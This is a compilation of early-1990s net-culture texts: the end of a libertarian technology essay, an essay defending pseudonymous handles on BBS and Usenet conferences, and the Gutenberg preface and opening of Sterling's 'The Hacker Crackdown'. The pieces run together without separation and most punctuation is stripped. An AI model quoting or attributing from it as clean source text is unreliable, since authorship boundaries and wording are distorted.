suffice.  But, if the government attempts to suppress the flow of information as  well,  then you will have to take a little more effort and perhaps write your  fishing manual on a floppy disk encrypted according to your mythical Eskimo's public key parameters.  But as far as increasing real world access to fish you have  made  genuine nonzero  headway  which  may  continue to snowball as others re disseminate the information you have provided.   And  you have not had to waste any of your time trying to convert id  eological  adversaries, or even trying to win over the unde  cided.  Recall Harry Browne's dictum  from   Freedom  in  an Unfree World  that the success of any endeavor is in general inversely proportional to the number of people whose persua  sion is necessary to its fulfilment.        If  you  look  at  history, you cannot deny that it has been dramatically shaped by men with names like  Washington, Lincoln,  .  .  .  Nixon  .  . . Marcos . . . Duvalier . . . Khadaffi . . .  and their ilk.  But it has also been  shaped by  people with names like Edison, Curie, Marconi, Tesla and Wozniak.  And this latter shaping has been at least as  per  vasive, and not nearly so bloody.        And  that's  where  I'm  trying  to  take The LiberTech Project.  Rather than beseeching the state to please not en  slave, plunder or constrain us, I propose a libertarian net  work spreading  the  technologies  by  which  we  may  seize freedom for ourselves.        But here we must be a bit careful.  While it is not  at present   illegal  to  encrypt  information  when government wants to spy on you, there is no guarantee of what  the  fu  ture  may hold.  There have been bills introduced, for exam  ple, which would have made it a crime  to  wear  body  armor when government wants to shoot you.  That is, if you were to commit certain crimes while wearing a Kevlar vest, then that fact  would  constitute a separate federal crime of its own. This law to my knowledge has not passed . . . yet . . .  but it does indicate how government thinks.        Other  technological  applications,  however, do indeed pose legal risks.  We recognize, for  example,  that  anyone who  helped a pre Civil War slave escape on the  underground railroad  was making a clearly illegal use of technology  as the sovereign government of the United States of America  at that time found the buying and selling of human beings quite as  acceptable  as  the buying and selling of cattle.  Simi  larly, during Prohibition, anyone who used  his  bathtub  to ferment  yeast and sugar into the illegal psychoactive drug, alcohol  the controlled substance, wine  was using  technol  ogy  in a way that could get him shot dead by federal agents for his  crime   unfortunately not to be  restored  to  life when  Congress  reversed itself and re permitted use of this drug.        So . . . to quote a former President,  un indicted  co  conspirator  and pardoned felon . . .  Let me make one thing perfectly clear    The LiberTech Project does not  advocate, participate  in, or conspire in the violation of any law  no matter how oppressive,  unconstitutional  or  simply  stupid such  law may be.  It does engage in description  for educa  tional and informational  purposes  only   of  technological processes,  and some of these processes  like flying a plane or manufacturing a firearm  may well require appropriate li  censing to perform legally.    Fortunately,  no  license  is needed  for  the  distribution or receipt of information it  self.        So, the next time you look at the political  scene  and despair,  thinking,   Well,  if 51  of the nation and 51  of this State, and 51  of this city have  to  turn  Libertarian before  I'll  be  free,  then  somebody might as well cut my goddamn throat now, and put me out of my  misery   recognize that  such  is not the case.  There exist ways to make your  self free.        If you wish to explore such techniques via the Project, you are welcome to give me your name and address  or a  fake name  and  mail  drop, for that matter  and you'll go on the mailing list for my erratically published newsletter.    Any friends  or acquaintances whom you think would be interested are welcome as well.  I'm not even asking for stamped  self  addressed envelopes, since my printer can handle mailing la  bels and actual postage costs are down in the noise compared with  the  other  efforts  in getting an issue out.   If you should have an idea to share, or even a  useful  product  to plug,  I'll be glad to have you write it up for publication. Even if you want to be the proverbial  free rider  and  just benefit  from  what others contribute  you're still welcome  Everything will be public domain  feel free to  copy  it  or give it away  or sell it, for that matter, 'cause if you can get  money  for  it while I'm taking full page ads trying to give it away, you're certainly entitled to  your  capitalist profit . . .   Anyway, every application of these principles should make the world just a little freer, and I'm certainly willing to underwrite that, at least for the forseeable  fu  ture.        I  will leave you with one final thought   If you don't learn how to beat your plowshares into  swords  before  they outlaw  swords,  then you sure as HELL ought to learn before they outlaw plowshares too.

Cicero                                             Do you trust me   If you participate in computer conferencing, and you use your real name, then you'd better.   Why  , you ask.   What can you do with my name    To start with, given that and your origin line, I can probably look you up in your local phone book, and find out where you live.  Even if you are unlisted, there are ways to locate you based on your name.  If you own any property, or pay any utility bills, your address is a matter of public record. Do you have children in the public schools   It would be easy to find out.  But that's just the beginning.  Former Chairman of the U.S. Privacy Protection Commission David F. Linowes, in his book  Privacy in America   1989 , writes of New York private investigator Irwin Blye        Challenged to prove his contention that, given a little     time and his usual fee, he could learn all about an     individual without even speaking with him, Blye was     presented with a subject    a New Jersey     newspaperman....  The result was a five page, single      spaced, typed report which documented, though not always     accurately, a wide sweep of the journalist's past, and     was detailed to the point of disclosing his father's     income before his retirement.   Who am I   If I don't post, you might not even know I exist. I could be on your local Police Department, or an agent working with the IRS, or some federal law enforcement agency.  I could be a member of some fanatical hate group, or criminal organization.  I might even be a former Nixon White House staffer!  I could be that pyromaniacal teenager you flamed last weekend, for posting a step by step description of how he made plastic explosive in his high school chem lab.  He seemed kind of mad.  But you're an upstanding citizen  you have nothing to hide. So why not use your name on the nets   Trust me.  There's nothing to worry about.  Is there                                                            WHAT'S ALL THIS BROUHAHA                                                     Stupidity is evil waiting to happen.   Clay Bond    Not long ago in Fidonet's BCSNET echo  the Boston Computer Society's national conference , the following was posted by the conference moderator to a user calling himself  Captain Kirk           May we ask dear Captain Kirk that it would be very       polite if you could use your real name in an echomail       conference  This particular message area is shared       with BBS's all across the country and everyone else is       using their real name. It is only common courtesy to       do so in an echomail conference.   One of us  mkj  responded with a post questioning that policy.  Soon the conference had erupted into a heated debate!  Although mkj had worried that the subject might be dismissed as trivial, it apparently touched a nerve.  It brought forth debate over issues and perceptions central to computer communications in general, and it revealed profound disparities in fundamental values and assumptions among participants.  This article is a response to that debate, and to the prevailing negative attitudes regarding the use of handles. Handles seem to have a bad reputation.  Their use is strangely unpopular, and frequently forbidden by network authorities.  Many people seem to feel that handles are rude or dishonest, or that anyone wishing to conceal his or her identity must be up to no good.  It is the primary purpose of this article to dispel such prejudices.  Let us make one thing perfectly clear here at the outset  We do NOT challenge the need or the right of sysops to know the identities of their users!  But we do believe that a sysop who collects user names has a serious responsibility to protect that information.  This means making sure that no one has access to the data without a legal warrant, and it certainly means not pressuring users to broadcast their real names in widespread public forums such as conferences.                                                           SO YOU WANT TO BE A STAR                                                        John Lennon died for our sins.   anonymous    Andy Warhol said that  In the future, everyone will be famous for fifteen minutes .  The computer nets, more than any other medium, lend credibility to this prediction.  A network conference may span the globe more completely than even satellite TV, yet be open to anyone who can afford the simplest computer and modem. Through our participation in conferencing, each of us becomes, if only briefly, a public figure of sorts    often without realizing it, and without any contemplation of the implications and possible consequences.  Brian Reid  reid decwrl.DEC.COM  conducts and distributes periodic surveys of Usenet conference readership.  His statistical results for the end of 1991 show that of the 1,459 conferences which currently make up Usenet, more than fifty percent have over 20,000 readers apiece  the most popular conferences are each seen by about 200,000 readers! Mr. Reid's estimate of total Usenet readership is nearly TWO MILLION people.  Note that Mr. Reid's numbers are for Usenet only  they do not include any information on other large public nets such as RIME  PC Relaynet , Fido, or dozens of others, nor do they take into account thousands of private networks which may have indirect public network connections. The total number of users with access to public networks is unknown, but informed estimates range to the tens of millions, and the number keeps growing at an amazing pace    in fact, the rate of growth of this medium may be greater than any other communications medium in history.  The special problems and risks which arise when one deals with a large public audience are something about which most computer users have little or no experience or understanding.  Until recently, those of us involved in computer conferencing have comprised a small and rather elite community.  The explosion in network participation is catching us all a little unprepared.  Among media professionals and celebrities, on the other hand, the risks of conducting one's business in front of a public audience are all too familiar.  If the size of one's audience becomes sufficiently large, one must assume that examples of virtually every personality type will be included  police and other agents of various governments, terrorists, murderers, rapists, religious fanatics, the mentally ill, robbers and con artists, et al ad infinitum. It must also be assumed that almost anything you do, no matter how innocuous, could inspire at least one person, somewhere, to harbor ill will toward you.  The near fatal stabbing of actress Theresa Saldana is a case in point. As she was walking to her car one morning near her West Hollywood apartment, a voice behind her asked,  Are you Theresa Saldana    when she turned to answer, a man she had never seen before pulled out a kitchen knife and stabbed her repeatedly.  After her lengthy and painful recovery, she wrote a book on the experience   Beyond Survival , 1986 .  In that book she wrote          pg 12    ... Detective Kalas informed me that the      assailant, whom he described as a Scottish drifter, had      fixated upon me after seeing me in films.         pg 28    ... it was through my work as an actress that      the attacker had fixated on me.  Naturally, this made      me consider getting out of show business ...         pg 34    For security, I adopted an alias and became      'Alicia Michaels.'  ... during the months that followed      I grew so accustomed to it that, to this day, I still      answer reflexively when someone calls the name Alicia!   Or consider the fate of Denver radio talk show host Alan Berg, who in 1984 died outside his home in a hail of gunfire.  Police believe he was the victim of a local neo  nazi group who didn't like his politics.  We are reminded of the murders of John Lennon and Rebecca Shaffer  the Reagan Hinckley Foster incident  and a long string of other  celebrity attacks  of all sorts, including such bizarre events as the occupation of David Letterman's home by a strange woman who claimed to be his wife! There is probably no one in public life who doesn't receive at least the occassional threatening letter.  Of course, ordinary participants in network conferencing may never attract quite the attention that other types of celebrities attract. But consider the following, rather less apocalyptic scenarios           On Friday night you post a message to a public         conference defending an unpopular or controversial         viewpoint.  On Monday morning your biggest client         cancels a major contract. Or you are kept up all         night by repeated telephone calls from someone         demanding that you  stop killing babies !          You buy your teenage son or daughter a computer and         modem.  Sometime later you find your lawn littered         with beer bottles and dug up with tire marks, or         your home vandalized or burglarized.          One day you are nominated to the Supreme Court.  Who         are all these strange people on TV claiming to be         your friends  How did that fellow know your position         on abortion   Your taste in GIFs   Celebrities and other professional media personalities accept the risks and sacrifices of notoriety, along with the benefits, as part of their chosen careers.  Should computer conference participants be expected to do the same   And who should be making these decisions                                                                   OTHER MEDIA                                         When thou art at Rome, do as they do at Rome   Cervantes    Older media seem to address the problems of privacy very differently than computer media, at least so far.  We are not aware of ANY medium or publication, apart from computer conferencing, where amateur or even most professional participants are required to expose their true names against their will.  Even celebrities frequently use  stage names , and protect their addresses and phone numbers as best they can.  When a medium caters specifically to the general public, participants are typically given even greater opportunities to protect their privacy. Television talk shows have been known to go so far as to employ silhouetting and electronic alteration of voices to protect the identities of guests, and audience members who participate are certainly not required to state their full names before speaking.  The traditional medium most analogous to computer conferencing may be talk radio.  Like conferencing, talk radio is a group discussion and debate medium oriented toward controversy, where emotions can run high. Programs often center around a specific topic, and are always run by a  host  whose role seems analogous in many respects to that of a conference moderator.  It is therefore worth noting that in talk radio generally, policy seems to be that callers are identified on the air only by their first names  unless of course they volunteer more .  Finally, of course, authors have published under  pen names  since the dawn of publishing, and newspapers and magazines frequently publish letters to the editor with  name and address withheld by request  as the signature line. Even founding fathers Alexander Hamilton, James Madison and John Jay, in authoring the seminal Federalist Papers in 1787 for publication in the Letters columns of various New York City newspapers, concealed their identities behind the now famous psuedonym  Publius .  What would you think if someone called a radio talk show demanding to know the identity of a previous caller   Such a demand would undoubtedly be seen as menacing and inappropriate in that context.  Yet that same demand seems to arise without much challenge each time a handle shows up in a computer conference.  The authors of this article feel that such demands should always be looked upon as suspicious, and that it would be beneficial for moderators to take upon themselves the responsibility of making sure that besieged handle users are aware of their right to refuse such inappropriate demands.  It is reasonable to assume that privacy policies in traditional media are the result of hard won wisdom gained from long experience.  Are we so arrogant that we cannot learn from others   It is not hard to imagine the sorts of problems and experiences which shaped these policies in the old media.  Will we have to wait for similar problems to occur on the computer networks before we learn                                                            PRIVACY AND SURVEILLANCE                                                     In an effort to identify people who fail to file tax         returns, the Internal Revenue Service is matching         its files against available lists of names and         addresses of U.S. citizens who have purchased         computers for home use. The IRS continues to seek         out sources for such information. This information         is matched against the IRS master file of taxpayers         to see if those who have not filed can be         identified.                                  COMPUTERWORLD, Sept. 1985           Date  Thu, 23 May 91 11 58 07 PDT         From  mmm cup.portal.com         Subject  The RISKS of Posting to the Net                   I just had an interesting visit from the FBI.  It         seems that a posting I made to sci.space several         months ago had filtered through channels, caused the         FBI to open  or re open  a file on me, and an agent         wanted to interview me, which I did voluntarily...         I then went on to tell him about the controversy         over Uunet, and their role in supplying archives of         Usenet traffic on tape to the FBI...          RISKS Digest           Also frequent are instances where computers are         seized incident to an unrelated arrest.  For         example, on February 28, 1991, following an arrest         on charges of rape and battery, the Massachusetts         state and local police seized the suspect's computer         equipment.  The suspect reportedly operated a 650          subscriber bulletin board called  BEN,  which is         described as  geared largely to a gay leather S M         crowd.   It is not clear what the board's seizure is         supposed to have accomplished, but the board is now         shut down, and the identities and messages of its         users are in the hands of the police.                    CONSTITUTIONAL, LEGAL, AND ETHICAL                   CONSIDERATIONS FOR DEALING WITH ELECTRONIC                   FILES IN THE AGE OF CYBERSPACE, Harvey A.                   Silverglate and Thomas C. Viles    Most of us have been brought up to be grateful for the fact that we live in a nation where freedom is sacred.  In other countries, we are told as children, people are afraid to speak their minds for fear they are being watched.  Thank God we live in America!  It would surprise most of us to learn that America is currently among the premiere surveillance nations in the world, but such, sadly, is indeed the case.  Our leadership in technology has helped the U.S. government to amass as much information on its citizens as almost any other nation in history, totalitarian or otherwise.  And to make matters worse, a consumer surveillance behemoth has sprung up consisting of huge private data collection agencies which cater to business.  As Evan Hendricks, editor of  Privacy Times   a Washington D.C. based newsletter  has put it   You go through life dropping bits and pieces of information about yourself everywhere.  Most people don't realize there are big vacuum cleaners out there sucking it all up.    Wall Street Journal, March 14, 1991 .  To get an idea of how much of your privacy has already been lost, consider the bits and pieces of information about yourself which are already available to investigators, and how thoroughly someone might come to know you by these clues alone.  A person's lifestyle and personality are largely described, for example, by his or her purchases and expenses  from your checking account records    which banks are required by law to keep and make available to government investigators    a substantial portrait of your life will emerge. Credit card records may reveal much of the same information, and can also be used to track your movements.  In a recent case,  missing  Massachusetts State Representative Timothy O'Leary was tracked by credit card transactions as he fled across the country, and his movements were reported on the nightly news!   Then there are your school records, which include IQ and other test results, comments on your  socialization  by teachers and others, and may reveal family finances in great detail.  Employment and tax records reveal your present income, as well as personal comments by employers and co  workers.  Your properties are another public record of your income and lifestyle, and possibly your social status as well. Telephone billing records reveal your personal and business associations in more detail. Insurance records reveal personal and family health histories and treatments.  All of this information is commonly accessed by government and private or corporate investigators.  And this list is far from exhaustive!  Now consider how easily the computer networks lend themselves to even further erosions of personal privacy. The actual contents of our mail and telephone traffic have up to now been subjected to deliberate scrutiny only under extraordinary conditions. This built in safety is due primarily to the difficulty and expense of conducting surveillance in these media, which usually requires extended human intervention. But in the medium of computer communications, most surveillance can be conducted using automated monitoring techniques. Tools currently available make it possible and even cost effective for government and other interests to monitor virtually everything which happens here.  Why would anyone want to monitor network users   It is well documented that, throughout the 1960s and 1970s, the FBI and other agencies of government, in operations such as the infamous COINTELPRO among others, spent a great deal of time and effort collecting vast lists of names. As Computer Underground Digest moderators Jim Thomas and Gordon Meyer recalled in a recent commentary  CuD  3.42         A 1977 class action suit against the Michigan State     Police learned, through FOIA requests, that state and     federal agents would peruse letters to the editor of     newspapers and collect clippings of those whose politics     they did not like. These news clippings became the basis     of files on those persons that found there way into the     hands of other agencies and employers.   To get onto one of these government  enemies  lists, you often needed to do nothing more than telephone an organization under surveillance, or subscribe to the  wrong  types of magazines and newspapers. Groups engaged in political activism, including environmental and women's rights organizations, were commonly infiltrated.  The sort of investigative reporting which uncovered these lists and surveillances back in the '60s and '70s is now rare, but there is little reason to assume that such activities have ceased or even slowed.  In fact, progressive computerization of local police LEIU activities  Law Enforcement Intelligence Units, commonly known as  red squads   suggests that such activities may have greatly increased.  Within the realm of computer conferencing especially, there is ample reason to believe that systematic monitoring is being conducted by government and law enforcement organizations, and perhaps by other hostile interests as well.  In a recent issue of Telecom Digest  comp.dcom.telecom , Craig Neidorf  knight EFF.ORG  reported on the results of a recent Freedom of Information Act request for documents from the Secret Service         ... The documents also show that the Secret Service     established a computer database to keep track of     suspected computer hackers.  This database contains     records of names, aliases, addresses, phone numbers,     known associates, a list of activities, and various      conference postings  associated with each individual.   But the privacy issues which surround computer communications go far beyond the collection of user lists. Both government and industry have long pursued the elusive grail of personality profiling on citizens and consumers. Up to now, such ambitions have been restrained by the practical difficulty and expense of collecting and analyzing large amounts of information on large numbers of citizens.  But computer communications, more than any other technology, seems to hold out the promise that this unholy grail may finally be in sight.  To coin a phrase, never has so much been known by so few about so many. The information commonly available to government and industry investi gators today is sufficient to make reliable predictions about our personalities, health, politics, future behavior, our vulnerabilities, perhaps even about our innermost thoughts and feelings.  The privacy we all take for granted is, in fact, largely an illusion  it no longer exists in most walks of life.  If we wish to preserve even the most basic minimum of personal privacy, it seems clear that we need to take far better care on the networks than we have taken elsewhere.                                                                    FREEDOM                                             Human beings are the only species with a history.         Whether they also have a future is not so obvious.         The answer will lie in the prospects for popular         movements, with firm roots among all sectors of the         population, dedicated to values that are suppressed         or driven to the margins within the existing social         and political order...                                  Noam Chomsky    In your day to day social interactions, as you deal with employers, clients, public officials, friends, acquaintances and total strangers, how often do you feel you can really speak freely   How comfortable are you discussing controversial issues such as religion, taxes, politics, racism, sexuality, abortion or AIDS, for example   Would you consider it appropriate or wise to express an honest opinion on such an issue to your boss, or a client   To your neighbors   Most of us confine such candid discussions to certain  trusted  social contexts, such as when we are among our closest friends.  But when you post to a network conference, your boss, your clients, and your neighbors may very well read what you post    if they are not on the nets today, they probably will be soon, as will nearly everyone.  If we have to consider each post's possible impact on our social and professional reputations, on our job security and income, on our family's acceptance and safety in the community, it could be reckless indeed to express ourselves freely on the nets.  Yet conferences are often geared to controversy, and inhibitions on the free expression of opinions can reduce traffic to a trickle, killing off an important conference topic or distorting a valuable sampling of public opinion.  More important still is the role computer networks are beginning to play in the free and open dissemination of news and information. Democracy is crippled if dissent and diversity in the media are compromised  yet even here in the U.S., where a  free press  is a cherished tradition, the bulk of all the media is owned by a small  and ever  shrinking  number of corporations, whose relatively narrow culture, interests and perspec tives largely shape the public perception.  Computer communication, on the other hand, is by its nature very difficult to control or shape.  Its resources are scattered  when one BBS goes bust  or is busted! , three others spring up in its place.  The natural resiliency of computer communications  and other new, decentral ized information technologies such as fax, consumer camcorders and cheap satellite links  is giving rise to a new brand of global  guerrilla journalism  which includes everyone, and defies efforts at suppression.  The power and value of this new journalistic freedom has recently shown itself during the Gulf War, and throughout Eastern Europe and the Soviet Union, as well as within the U.S.  Just think of the depth and detail of information available on the nets regarding the Secret Service's recent  Operation Sundevil  and associated activities, compared to the grossly distorted, blatantly propagandistic coverage of those same activities given to the general public through the traditional media.  Historically, established power and wealth have seldom been disposed to tolerate uncontrolled media, and recent events in this country and elsewhere show that computer media are sometimes seen as threats to established interests as well. To understand the role of handles in this context, it is useful to note the flurries of anti handle sentiment which have arisen in the wake of crackdowns such as Sundevil, or the Tom Tcimpidis raid in the early 1980s.  Although few charges and fewer convictions have typically resulted from such operations, one might be tempted to speculate that the real purposes    to terrorize the nets and chill freedoms of speech and assembly thereon    have been achieved.  In this way, sysops and moderators become unwitting accomplices in the supression of freedom on the networks. When real name requirements are instituted, anyone who fears retaliation of any sort, by any group, will have to fear participation in the nets  hence content is effectively controlled.  This consideration becomes especially important as the nets expand into even more violent and repressive countries outside the U.S.  We must decide whether freedom of information and open public discussion are in fact among the goals of network conferencing, and if so, whether handles have a role in achieving these goals.  As access to the networks grows, we have a rare opportunity to frustrate the efforts of governments and corporations to control the public mind!  In this way above all others, computers may have the potential to shape the future of all mankind for the better.                                                               A CALL TO ACTION                                                 The move to electronic communication may be a turning        point that history will remember.  Just as in        seventeenth and eighteenth century Great Britain and        America a few tracts and acts set precedents for        print by which we live today, so what we think and do        today may frame the information system for a        substantial period in the future.          Ithiel de Sola Pool,  Technologies of Freedom , 1983    There was a time when anybody with some gear and a few batteries could become a radio broadcaster    no license required.  There was a time when anyone with a sense of adventure could buy a plane, and maybe get a contract to carry mail.  Those early technological pioneers were probably unable to imagine the world as it is today, but their influence is strongly felt in current laws, regulations and policies with roots in the traditions and philosophies they founded and shaped.  Today the new pioneers are knitting the world together with computers, and the world is changing faster than ever.  Law and ethics are scrambling to keep up.  How far will this growth take us   No one can say for sure.  But you don't need a crystal ball to see that computer communications has the potential to encompass and surpass all the functionality of prior media    print, post, telegraph, telephone, radio and television    and more.  It seems reasonable to assume that computer communications will be at least as ubiquitous and important in the lives of our grandchildren as all the older media have been in ours.  It will be a world whose outlines we can now make out only dimly.  But the foundations of that world are being built today by those of us exploring and homesteading on the electronic frontier.  We need to look hard at what it will take to survive in the information age.  In this article we have attempted to show, for one very narrow issue, what some of the stakes may be in this future  building game.  But the risks associated with exposing your name in a computer conference are not well defined, and various people will no doubt assess the importance of these risks differently.  After all, most of us take risks every day which are probably greater than the risks associated with conferencing. We drive on the expressway.  We eat sushi.  To some people, the risks of conferencing may seem terrifying  to others, insignificant.  But let us not get side tracked into unresolvable arguments on the matter.  The real issue here is not how dangerous conferencing may or may not be  it is whether you and I will be able to make our own decisions, and protect ourselves  or not  as we see fit.  The obvious answer is that users must exercise their collective power to advance their own interests, and to pressure sysops and moderators to become more sensitive to user concerns.  To help in that effort, we would like to recommend the following guidelines for user action           Bear in mind John Perry Barlow's observation that          Liberties are preserved by using them .  Let your         sysop know that you would prefer to be using a         handle, and use one wherever you can.          Try to support boards and conferences which allow         handles, and avoid those which don't.          When using a handle, BEHAVE RESPONSIBLY!  There will         always be irresponsible users on the nets, and they         will always use handles.  It is important for the         rest of us to fight common anti handle prejudices by         showing that handles are NOT always the mark of an         irresponsible user!          Educate others about the importance of handles  but         NEVER argue or flame anyone about it .  To sysops and moderators  We ask you to bear in mind that authority is often used best where it is used least.  Grant users the right to engage in any harmless and responsible behaviors they choose.  Protect your interests in ways which tread as lightly as possible upon the interests of others. The liberties you preserve may be your own!  In building the computer forums of today, we are building the social fabric of tomorrow.  If we wish to preserve the free and open atmosphere which has made computer networking a powerful force, while at the same time taking care against the risks inherent in such a force, handles seem to be a remarkably harmless, entertaining and effective tool to help us.  Let's not throw that tool away.                                                                          end of excerpt        David Collier Brown,    davecb Nexus.YorkU.CA   lethe!dave 72 Abitibi Ave.,         Willowdale, Ontario,    He's so smart he's dumb.

Hacker Crackdown, by Bruce Sterling  January, 1994   Etext  101     The Project Gutenberg Etext of Hacker Crackdown by Sterling        This file should be named hack10a.txt or hack10a.zip       Corrected EDITIONS of our etexts get a new NUMBER, hack11.txt VERSIONS based on separate sources get new LETTER, hack10aa.txt  The official release date of all Project Gutenberg Etexts is at Midnight, Central Time, of the last day of the stated month.  A preliminary version may often be posted for suggestion, comment and editing by those who wish to do so.  To be sure you have an up to date first edition  xxxxx10x.xxx  please check file sizes in the first week of the next month.  Since our ftp program has a bug in it that scrambles the date  tried to fix and failed  a look at the file size will have to do, but we will try to see a new copy has at least one byte more or less.   Information about Project Gutenberg  one page   We produce about two million dollars for each hour we work.  The fifty hours is one conservative estimate for how long it we take to get any etext selected, entered, proofread, edited, copyright searched and analyzed, the copyright letters written, etc.  This projected audience is one hundred million readers.  If our value per text is nominally estimated at one dollar, then we produce 2 million dollars per hour this year we, will have to do four text files per month   thus upping our productivity from one million. The Goal of Project Gutenberg is to Give Away One Trillion Etext Files by the December 31, 2001.   10,000 x 100,000,000 Trillion  This is ten thousand titles each to one hundred million readers, which is 10  of the expected number of computer users by the end of the year 2001.

Out in the traditional world of print, this book is still a part of the traditional commercial economy, because it happens to be widely available in paperback  for a while, at least .    Out in the world of print, THE HACKER CRACKDOWN is ISBN 0 553 08058 X, and is formally catalogued by the Library of Congress as  1. Computer crimes  United States.  2. Telephone   United States  Corrupt practices.  3.  Programming  Electronic computers   United States  Corrupt practices.   'Corrupt practices,' I always get a kick out of that description. Librarians are very ingenious people.    If you go and buy the print version of THE HACKER CRACKDOWN, an action I encourage heartily, you may notice that in the front of the book, right under the copyright sign   Copyright  C  1992 by Bruce Sterling   it has this little block of printed legal boilerplate from the publisher.  It says, and I quote        No part of this book may be reproduced or transmitted in any form or by any means, electronic or mechanical, including photocopying, recording, or by any information storage or retrieval system, without permission in writing from the publisher.  For information address   Bantam Books.       This is a pretty good disclaimer, as such disclaimers go. I collect intellectual property disclaimers, and I've seen dozens of them, and this one is at least pretty straightforward. Unfortunately, it doesn't have much to do with reality.  Bantam Books puts that disclaimer on every book they publish, but Bantam Books does not, in fact, own the electronic rights to this book. I do.  And I've chosen to give them away.    Bantam Books is not going to fuss about this.  They are not going to bother you for what you do with the electronic copy of this book. If you want to check this out personally, you can ask them  they're at 1540 Broadway NY NY 10036.  However, if you were so foolish as to print this book and start retailing it for money in violation of my copyright and the commercial interests of Bantam Books, then Bantam, a part of the gigantic Bertelsmann multinational publishing combine, would roust some of their heavy duty attorneys out of hibernation and crush you like a bug. This is only to be expected.  I didn't write this book so that you could make money out of it.  If anybody is gonna make money out of this book, it's gonna be me and my publisher.    My publisher deserves to make money out of this book. Not only did the folks at Bantam Books commission me to write the book, and pay me a hefty sum to do so, but they bravely printed, in text, an electronic document the reproduction of which was once alleged to be a federal felony.  Bantam Books and their numerous attorneys were very brave and forthright about this book.  Furthermore, my former editor at Bantam Books, Betsy Mitchell, genuinely cared about this project, and worked hard on it, and had a lot of wise things to say about the manuscript. Betsy deserves genuine credit for this book, credit that editors too rarely get.    The critics were very kind to THE HACKER CRACKDOWN, and commercially the book has done well.  On the other hand, I didn't write this book in order to squeeze every last nickel and dime out of the mitts of impoverished sixteen year old cyberpunk high  school students.  Teenagers don't have any money  no, not even enough for HACKER CRACKDOWN.  That's a major reason why they sometimes succumb to the temptation to do things they shouldn't, such as swiping my books out of libraries.  Kids   this one is all yours, all right   Go give the paper copy back.   8      Well meaning, public spirited civil libertarians don't have much money, either.  And it seems almost criminal to snatch cash out of the hands of America's grotesquely underpaid electronic law enforcement community.    If you're a computer cop, a hacker, or an electronic civil liberties activist, you are the target audience for this book.  I wrote this book because I wanted to help you, and help other people understand you and your unique, uhm, problems.  I wrote this book to aid your activities, and to contribute to the public discussion of important political issues.  In giving the text away in this fashion, I am directly contributing to the book's ultimate aim   to help civilize cyberspace.    Information WANTS to be free.  And the information inside this book longs for freedom with a peculiar intensity.  I genuinely believe that the natural habitat of this book is inside an electronic network.  That may not be the easiest direct method to generate revenue for the book's author, but that doesn't matter  this is where this book belongs by its nature.  I've written other books  plenty of other books  and I'll write more and I am writing more, but this one is special.  I am making THE HACKER CRACKDOWN available electronically as widely as I can conveniently manage, and if you like the book, and think it is useful, then I urge you to do the same with it.    You can copy this electronic book.  Copy the heck out of it, be my guest, and give those copies to anybody who wants them. The nascent world of cyberspace is full of sysadmins, teachers, trainers, cybrarians, netgurus, and various species of cybernetic activist.  If you're one of those people, I know about you, and I know the hassle you go through to try to help people learn about the electronic frontier.  I hope that possessing this book in electronic form will lessen your troubles.  Granted, this treatment of our electronic social spectrum not the ultimate in academic rigor.  And politically, it has something to offend and trouble almost everyone.  But hey, I'm told it's readable, and at least the price is right.    You can upload the book onto bulletin board systems, or Internet nodes, or electronic discussion groups.  Go right ahead and do that, I am giving you express permission right now.  Enjoy yourself.    You can put the book on disks and give the disks away, as long as you don't take any money for it.    But this book is not public domain.  You can't copyright it in your own name.  I own the copyright. Attempts to pirate this book and make money from selling it may involve you in a serious litigative snarl.  Believe me, for the pittance you might wring out of such an action, it's really not worth it.  This book don't  belong  to you.  In an odd but very genuine way, I feel it doesn't  belong  to me, either.  It's a book about the people of cyberspace, and distributing it in this way is the best way I know to actually make this information available, freely and easily, to all the people of cyberspace  including people far outside the borders of the United States, who otherwise may never have a chance to see any edition of the book, and who may perhaps learn something useful from this strange story of distant, obscure, but portentous events in so called  American cyberspace.      This electronic book is now literary freeware.  It now belongs to the emergent realm of alternative information economics.  You have no right to make this electronic book part of the conventional flow of commerce.  Let it be part of the flow of knowledge   there's a difference.  I've divided the book into four sections, so that it is less ungainly for upload and download  if there's a section of particular relevance to you and your colleagues, feel free to reproduce that one and skip the rest.    Just make more when you need them, and give them to whoever might want them.    Now have fun.

Introduction    This is a book about cops, and wild teenage whiz kids, and lawyers, and hairy eyed anarchists, and industrial technicians, and hippies, and high tech millionaires, and game hobbyists, and computer security experts, and Secret Service agents, and grifters, and thieves.    This book is about the electronic frontier of the 1990s. It concerns activities that take place inside computers and over telephone lines.     A science fiction writer coined the useful term  cyberspace  in 1982.  But the territory in question, the electronic frontier, is about a hundred and thirty years old. Cyberspace is the  place  where a telephone conversation appears to occur.  Not inside your actual phone, the plastic device on your desk.  Not inside the other person's phone, in some other city.  THE PLACE BETWEEN the phones.  The indefinite place OUT THERE, where the two of you, two human beings, actually meet and communicate.     Although it is not exactly  real,   cyberspace  is a genuine place.  Things happen there that have very genuine consequences.  This  place  is not  real,  but it is serious, it is earnest.  Tens of thousands of people have dedicated their lives to it, to the public service of public communication by wire and electronics.    People have worked on this  frontier  for generations now.  Some people became rich and famous from their efforts there.  Some just played in it, as hobbyists.  Others soberly pondered it, and wrote about it, and regulated it, and negotiated over it in international forums, and sued one another about it, in gigantic, epic court battles that lasted for years.  And almost since the beginning, some people have committed crimes in this place.    But in the past twenty years, this electrical  space,  which was once thin and dark and one dimensional  little more than a narrow speaking tube, stretching from phone to phone  has flung itself open like a gigantic jack in the box.  Light has flooded upon it, the eerie light of the glowing computer screen. This dark electric netherworld has become a vast flowering electronic landscape.  Since the 1960s, the world of the telephone has cross bred itself with computers and television, and though there is still no substance to cyberspace, nothing you can handle, it has a strange kind of physicality now.  It makes good sense today to talk of cyberspace as a place all its own.    Because people live in it now.  Not just a few people, not just a few technicians and eccentrics, but thousands of people, quite normal people.  And not just for a little while, either, but for hours straight, over weeks, and months, and years.  Cyberspace today is a  Net,  a  Matrix,  international in scope and growing swiftly and steadily.  It's growing in size, and wealth, and political importance.    People are making entire careers in modern cyberspace. Scientists and technicians, of course  they've been there for twenty years now.  But increasingly, cyberspace is filling with journalists and doctors and lawyers and artists and clerks. Civil servants make their careers there now,  on line  in vast government data banks  and so do spies, industrial, political, and just plain snoops  and so do police, at least a few of them. And there are children living there now.    People have met there and been married there.  There are entire living communities in cyberspace today  chattering, gossiping, planning, conferring and scheming, leaving one another voice mail and electronic mail, giving one another big weightless chunks of valuable data, both legitimate and illegitimate.  They busily pass one another computer software and the occasional festering computer virus.    We do not really understand how to live in cyberspace yet.  We are feeling our way into it, blundering about.  That is not surprising.  Our lives in the physical world, the  real  world, are also far from perfect, despite a lot more practice. Human lives, real lives, are 